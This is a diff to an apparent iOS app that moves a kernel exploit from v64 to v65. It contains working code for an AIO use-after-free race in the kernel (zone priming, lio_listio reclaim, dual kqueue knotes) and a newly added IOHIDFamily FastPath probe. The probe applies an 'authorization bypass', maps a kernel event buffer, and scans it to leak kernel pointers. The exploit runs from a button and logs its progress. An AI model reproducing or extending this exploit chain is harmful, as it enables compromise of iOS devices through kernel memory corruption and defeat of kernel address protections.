@@ -247,12 +247,12 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v64: v63 + dual-knote Phase B experiment. v63 proved LIFO reclaim works
-// with lio_listio batch (ext[1]=0x2000 = rcbs[0] occupying tcb's old slot).
-// v64 adds kq2 — rcbs[0] uses SIGEV_KEVENT on kq2 instead of SIGEV_NONE.
-// Phase A kevent64(kq) reads stale knote (workq entry). Phase B kevent64(kq2)
-// reads fresh knote (doneq entry). The key question: does the second kevent64
-// crash (FAR=0x58)? If not, TAILQ_REMOVE on doneq entry is validated.
+// v65: v64 + FastPath Phase 0 kernel pointer probe. v64 proved dual-knote
+// doesn't crash — Phase B TAILQ_REMOVE on doneq entry is safe. v65 adds a
+// pre-exploit FastPath probe: open IOHIDFamily user client, map event buffer,
+// scan for kernel pointers. Decouples read (FastPath IOConnectMapMemory64 scan)
+// from write (AIO UAF TAILQ_REMOVE), avoiding the ext[] offset mismatch dead end.
+// Phase 0 = FastPath probe, Phase A/B = dual-knote, Phase C = health check.
 // Key design:
 //   1. 7x zone priming, lio_listio batch reclaim (from v63)
 //   2. rcbs[0] SIGEV_KEVENT on kq2 — creates second knote to same slot S
@@ -277,9 +277,9 @@ struct v63_state {
     int kq;
     int kq2;                   // v64: second kqueue for rcbs[0]'s knote
     struct kevent64_s kev;
-    struct kevent64_s kev2;    // v64: Phase B kevent result
+    struct kevent64_s kev2;    // v65: Phase B kevent result
     int nev;
-    int nev2;                  // v64: Phase B kevent count
+    int nev2;                  // v65: Phase B kevent count
     int err;
     int freed;
     int reclaimed;
@@ -369,7 +369,7 @@ static void *v63_exploit_thread(void *arg) {
     int kq = kqueue();
     if (kq < 0) { st->err = errno; return NULL; }
 
-    // v64: second kqueue for rcbs[0]'s SIGEV_KEVENT knote
+    // v65: second kqueue for rcbs[0]'s SIGEV_KEVENT knote
     int kq2 = kqueue();
     if (kq2 < 0) { st->err = errno; close(kq); return NULL; }
     st->kq2 = kq2;
@@ -395,7 +395,7 @@ static void *v63_exploit_thread(void *arg) {
         rcbs[i].aio_nbytes = 8192 + i;   // unique per entry: 8192..8198
         rcbs[i].aio_offset = 0;
         rcbs[i].aio_lio_opcode = LIO_READ;
-        // v64: rcbs[0] with SIGEV_KEVENT on kq2 — creates second knote to slot S
+        // v65: rcbs[0] with SIGEV_KEVENT on kq2 — creates second knote to slot S
         if (i == 0) {
             rcbs[i].aio_sigevent.sigev_notify = SIGEV_KEVENT;
             rcbs[i].aio_sigevent.sigev_signo = kq2;
@@ -469,13 +469,13 @@ static void *v63_exploit_thread(void *arg) {
     for (int i = 0; i < V63_NRECLAIM; i++)
         while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
-    // v64 Phase A: kevent64(kq) — stale knote (tcb's old knote → reclaimed slot S)
+    // v65 Phase A: kevent64(kq) — stale knote (tcb's old knote → reclaimed slot S)
     struct kevent64_s kev = {};
     struct timespec ts = {10, 0};
     st->nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
     if (st->nev > 0) st->kev = kev;
 
-    // v64 Phase B: kevent64(kq2) — fresh knote (rcbs[0]'s knote → doneq entry).
+    // v65 Phase B: kevent64(kq2) — fresh knote (rcbs[0]'s knote → doneq entry).
     // Called IMMEDIATELY after Phase A. If entry was alive for Phase A (TAILQ_REMOVE
     // from doneq + zfree), Phase B reads from the same slot — may succeed (entry
     // not zeroed yet) or crash (FAR=0x58 if procp already zeroed).
@@ -499,7 +499,7 @@ static void *v63_exploit_thread(void *arg) {
         }
     }
 
-    // v64: Smart cleanup with two potential victims.
+    // v65: Smart cleanup with two potential victims.
     // Phase A kevent64(kq) freed one reclaim entry via aio_entry_unref.
     // Phase B kevent64(kq2) may have freed rcbs[0] via aio_entry_unref.
     // Match ext[1] against unique nbytes to skip consumed entries.
@@ -582,7 +582,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v64" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v65" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5948,6 +5948,186 @@ static void *e2_free_and_ool_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
+#pragma mark - Phase 0: FastPath Kernel Pointer Probe
+
+// v65 Phase 0: Use IOHIDFamily FastPathUserClient to map an event buffer
+// and scan for kernel pointers. This provides an independent "read channel"
+// decoupled from the AIO ext[] offset mismatch dead end.
+- (NSDictionary *)runFastPathKernelPointerProbe {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    result[@"success"] = @NO;
+    result[@"kernelPointers"] = @[];
+
+    if (![self loadIOKitSymbols]) {
+        [self appendLog:@"Phase0 FastPath: IOKit symbols unavailable"];
+        return result;
+    }
+
+    if (!sIOConnectMapMemory64) {
+        [self appendLog:@"Phase0 FastPath: IOConnectMapMemory64 unavailable"];
+        return result;
+    }
+
+    [self appendLog:@"Phase0 FastPath: searching IOHIDEventService..."];
+
+    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
+    if (!matching) {
+        [self appendLog:@"Phase0 FastPath: IOServiceMatching failed"];
+        return result;
+    }
+
+    io_iterator_t iter = MACH_PORT_NULL;
+    if (sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter) != KERN_SUCCESS || iter == MACH_PORT_NULL) {
+        [self appendLog:@"Phase0 FastPath: no matching services"];
+        return result;
+    }
+
+    io_service_t service = sIOIteratorNext(iter);
+    sIOObjectRelease(iter);
+    if (service == MACH_PORT_NULL) {
+        [self appendLog:@"Phase0 FastPath: no IOHIDEventService found"];
+        return result;
+    }
+
+    io_connect_t conn = MACH_PORT_NULL;
+    kern_return_t openKr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
+    sIOObjectRelease(service);
+
+    if (openKr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
+        [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: IOServiceOpen failed 0x%x", openKr]];
+        return result;
+    }
+
+    // Authorization bypass — same XML that works for Trigger UAF
+    kern_return_t gateKr = [self fastPathOpen:conn propertiesXML:kOpenPropertiesXML];
+    [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: open(selector0)=0x%x (%s)",
+                     gateKr, mach_error_string(gateKr)]];
+
+    if (gateKr != KERN_SUCCESS) {
+        [self appendLog:@"Phase0 FastPath: authorization bypass failed — FastPath patched on this iOS version?"];
+        sIOServiceClose(conn);
+        return result;
+    }
+
+    // Map the event buffer
+    mach_vm_address_t mapAddr = 0;
+    mach_vm_size_t mapSize = 0;
+    kern_return_t mapKr = sIOConnectMapMemory64(conn, kMemoryTypeEventBuffer,
+                                                  mach_task_self(), &mapAddr, &mapSize, 1);
+    [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: map(type=0)=0x%x addr=0x%llx size=%llu",
+                     mapKr, mapAddr, mapSize]];
+
+    if (mapKr != KERN_SUCCESS || mapAddr == 0 || mapSize == 0) {
+        [self appendLog:@"Phase0 FastPath: map failed"];
+        sIOServiceClose(conn);
+        return result;
+    }
+
+    // Trigger copyEvent to push kernel data through the buffer
+    int copySuccesses = 0;
+    int totalKernelPtrs = 0;
+    NSMutableArray *allPointers = [NSMutableArray array];
+
+    for (int round = 0; round < 20; round++) {
+        uint64_t scalarsIn[2] = { 0, 1 };
+        uint8_t structOut[256];
+        size_t structOutSize = sizeof(structOut);
+        kern_return_t copyKr = sIOConnectCallMethod(conn, kSelectorCopyEvent,
+            scalarsIn, 2, NULL, 0, NULL, NULL, structOut, &structOutSize);
+        if (copyKr == KERN_SUCCESS) copySuccesses++;
+
+        // Scan mapped buffer after each copyEvent
+        const uint8_t *base = (const uint8_t *)(uintptr_t)mapAddr;
+        size_t scanLen = MIN((size_t)mapSize, (size_t)kMappedProbeMax);
+
+        NSArray<NSDictionary *> *ptrs = [self scanForKernelPointers:base
+                                                              length:scanLen
+                                                          maxResults:20
+                                                           connIndex:0];
+        if (ptrs.count > 0) {
+            totalKernelPtrs += (int)ptrs.count;
+            [allPointers addObjectsFromArray:ptrs];
+        }
+
+        // Also scan struct output
+        NSArray<NSDictionary *> *structPtrs = [self scanForKernelPointers:structOut
+                                                                    length:structOutSize
+                                                                maxResults:10
+                                                                 connIndex:-1];
+        if (structPtrs.count > 0) {
+            [allPointers addObjectsFromArray:structPtrs];
+        }
+
+        usleep(1000); // 1ms between rounds
+    }
+
+    [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: copyEvent=%d/20 ok, %d kernel ptrs in mapped buf, %lu total candidates",
+                     copySuccesses, totalKernelPtrs, (unsigned long)allPointers.count]];
+
+    // Deduplicate by value
+    NSMutableDictionary *uniqueByValue = [NSMutableDictionary dictionary];
+    for (NSDictionary *p in allPointers) {
+        NSString *val = p[@"value"];
+        if (val && !uniqueByValue[val]) {
+            uniqueByValue[val] = p;
+        }
+    }
+
+    // Log unique kernel pointer candidates
+    NSArray *sortedKeys = [[uniqueByValue allKeys] sortedArrayUsingSelector:@selector(compare:)];
+    int shown = 0;
+    for (NSString *val in sortedKeys) {
+        if (shown >= 15) break;
+        NSDictionary *p = uniqueByValue[val];
+        [self appendLog:[NSString stringWithFormat:@"  kptr[%d]: %@ offset=%@ inArray=%@ ctx=%@",
+                         shown, val, p[@"offset"], p[@"inArray"], p[@"context"]]];
+        shown++;
+    }
+    if (sortedKeys.count > 15) {
+        [self appendLog:[NSString stringWithFormat:@"  ... and %lu more unique kernel pointer candidates",
+                         (unsigned long)(sortedKeys.count - 15)]];
+    }
+
+    // Store result
+    result[@"success"] = @(copySuccesses > 0);
+    result[@"kernelPointers"] = [uniqueByValue allKeys];
+    result[@"copyEventOk"] = @(copySuccesses);
+    result[@"mapSize"] = @(mapSize);
+    result[@"mapAddr"] = [NSString stringWithFormat:@"0x%llx", mapAddr];
+
+    // If we found kernel pointers, save the first one for proof
+    if (sortedKeys.count > 0) {
+        NSString *firstVal = sortedKeys[0];
+        uint64_t leakValue = 0;
+        sscanf(firstVal.UTF8String, "0x%llx", &leakValue);
+        self.proofKernelPointerLeak = YES;
+        self.proofKernelPointerValue = leakValue;
+        self.proofKernelPointerHex = firstVal;
+        [self appendLog:[NSString stringWithFormat:@"Phase0 FastPath: stored proof ptr=%@", firstVal]];
+
+        // Persist to file
+        NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        NSString *kpDir = [docsDir stringByAppendingPathComponent:@"sword"];
+        [[NSFileManager defaultManager] createDirectoryAtPath:kpDir withIntermediateDirectories:YES attributes:nil error:nil];
+        NSString *kpPath = [kpDir stringByAppendingPathComponent:@"kptr.txt"];
+        [[NSString stringWithFormat:@"%@ offset=%@\n", firstVal, uniqueByValue[firstVal][@"offset"]] writeToFile:kpPath atomically:YES];
+    }
+
+    // Cleanup: close connection (unmap if possible)
+    BOOL unmapped = NO;
+    if (sIOConnectUnmapMemory64) {
+        kern_return_t unmapKr = sIOConnectUnmapMemory64(conn, kMemoryTypeEventBuffer, mach_task_self(), mapAddr);
+        unmapped = (unmapKr == KERN_SUCCESS);
+    }
+    if (!unmapped && mapAddr != 0) {
+        vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
+    }
+    sIOServiceClose(conn);
+
+    [self appendLog:@"Phase0 FastPath: complete"];
+    return result;
+}
+
 - (void)aioUafTapped {
     // v25: Strong re-entrancy guard — @synchronized only wraps debounce,
     // but static flag prevents any possibility of concurrent execution.
@@ -5968,7 +6148,14 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v64 (Dual-Knote Phase B Experiment) =========="];
+    [self appendLog:@"\n========== AIO UAF v65 (FastPath Probe + Dual-Knote) =========="];
+
+    // ---- Phase 0 v65: FastPath kernel pointer probe ----
+    [self appendLog:@"\n--- Phase 0 v65: FastPath kernel pointer probe ---"];
+    NSDictionary *fpResult = [self runFastPathKernelPointerProbe];
+    [self appendLog:[NSString stringWithFormat:@"Phase0 result: success=%@ copyEventOk=%@ uniquePtrs=%lu",
+                     fpResult[@"success"], fpResult[@"copyEventOk"],
+                     (unsigned long)[fpResult[@"kernelPointers"] count]]];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5980,19 +6167,19 @@ static void *e2_free_and_ool_racer(void *arg) {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         @autoreleasepool {
 
-    // v64: Diagnostic in Documents (persists across kernel panic / reboot)
+    // v65: Diagnostic in Documents (persists across kernel panic / reboot)
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v64.txt"];
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v65.txt"];
     unlink(diagPath.UTF8String);
 
-    // v64: SINGLE file — all AIO ops use same fd
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v64.bin"];
+    // v65: SINGLE file — all AIO ops use same fd
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v65.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v64" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v65" forState:UIControlStateNormal];
         });
         return;
     }
@@ -6006,8 +6193,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v64: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
-    [self appendLog:@"\n--- Phase A v64: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
+    // ---- Phase A v65: Dual-knote — stale knote(kq) + fresh knote(kq2) ----
+    [self appendLog:@"\n--- Phase A v65: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6068,7 +6255,7 @@ static void *e2_free_and_ool_racer(void *arg) {
                 entryAddr = kev.ident;
             }
 
-            // v64 Phase B logging — second knote result
+            // v65 Phase B logging — second knote result
             if (nev2 > 0) {
                 [self appendLog:@"  *** Phase B DONE ***"];
                 [self appendLog:[NSString stringWithFormat:@"  kevB.ident=0x%llx filter=%hd flags=0x%x fflags=0x%x",
@@ -6103,8 +6290,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v64: Health check ----
-    [self appendLog:@"\n--- Phase C v64: Health check ---"];
+    // ---- Phase C v65: Health check ----
+    [self appendLog:@"\n--- Phase C v65: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6130,11 +6317,11 @@ cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v64 Complete =========="];
+    [self appendLog:@"========== AIO UAF v65 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v64" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v65" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
